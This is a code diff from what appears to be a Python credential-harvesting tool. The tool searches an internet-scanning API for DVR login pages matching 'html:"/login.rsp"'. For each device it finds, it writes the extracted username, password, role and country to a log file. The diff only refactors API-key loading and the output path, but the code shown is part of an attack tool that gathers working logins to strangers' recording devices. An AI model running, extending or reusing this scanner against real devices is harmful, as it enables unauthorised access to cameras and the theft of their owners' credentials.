@@ -15,7 +15,13 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Configuration
-API_KEY = "YOURAPI"
+import os
+import sys
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from common import get_api_key, open_output
+
+API_KEY = get_api_key()
 SEARCH_FOR = 'html:"/login.rsp"'
 session = requests.Session()
 class Colors:
@@ -89,7 +95,7 @@ def test_dvr (IP,PORT,CC):
 				hdRole = Colors.GREEN + "Role ID"  + Colors.DEFAULT
 
 				cabeceras = [hdUsr, hdPass, hdRole]
-				text_file = open("./cfg/DVR-Login.cfg", "a")
+				text_file = open_output("cfg/DVR-Login.cfg", "a")
 				text_file.write("http://"+IP+":"+PORT+" - Username: "+str(_usuario)+" Password: "+str(_password)+" - Country: "+CC+"\n")
 				text_file.close()
 
